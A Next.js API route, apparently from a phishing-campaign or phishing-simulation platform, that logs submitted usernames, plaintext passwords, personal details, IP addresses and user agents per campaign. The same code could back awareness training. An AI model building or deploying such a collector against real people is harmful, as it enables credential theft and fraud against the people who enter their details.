// pages/api/fake-submission.js
import mysql from 'mysql2/promise';
import jwt from 'jsonwebtoken';

const pool = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  port: process.env.DB_PORT,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_DATABASE,
});

export default async function handler(req, res) {
  if (req.method === 'POST') {
    // Get token from Authorization header.
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ message: 'Missing token.' });
    }
    const token = authHeader.split(' ')[1];
    let userId;
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      userId = decoded.user_id;
      if (!userId) {
        return res.status(400).json({ message: 'User ID not found in token payload.' });
      }
    } catch (err) {
      console.error('JWT verification error:', err);
      return res.status(401).json({ message: 'Invalid token.' });
    }

    // Retrieve data from request body.
    const { campaignId, type, username, password, name, address, phone, email } = req.body;

    if (!campaignId || !type) {
      return res.status(400).json({ message: 'Campagne ou type non fourni.' });
    }

    // Capture IP address and user-agent
    const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user_agent = req.headers['user-agent'] || '';

    try {
      // Ensure your campaigns table has a "user_id" column.
      const insertQuery = `
        INSERT INTO campaigns
          (campaign_id, submission_type, username, password, name, address, phone, email, ip_address, user_agent, user_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `;

      const values = [
        campaignId,
        type,
        username || null,
        password || null,
        name || null,
        address || null,
        phone || null,
        email || null,
        ip_address,
        user_agent,
        userId, // insert the user_id from the token
      ];

      await pool.query(insertQuery, values);

      return res.status(200).json({ message: 'Informations enregistrées.' });
    } catch (error) {
      console.error("Erreur lors de l'insertion:", error);
      return res.status(500).json({ message: "Erreur serveur lors de l'enregistrement." });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    return res.status(405).json({ message: `Méthode ${req.method} non autorisée.` });
  }
}
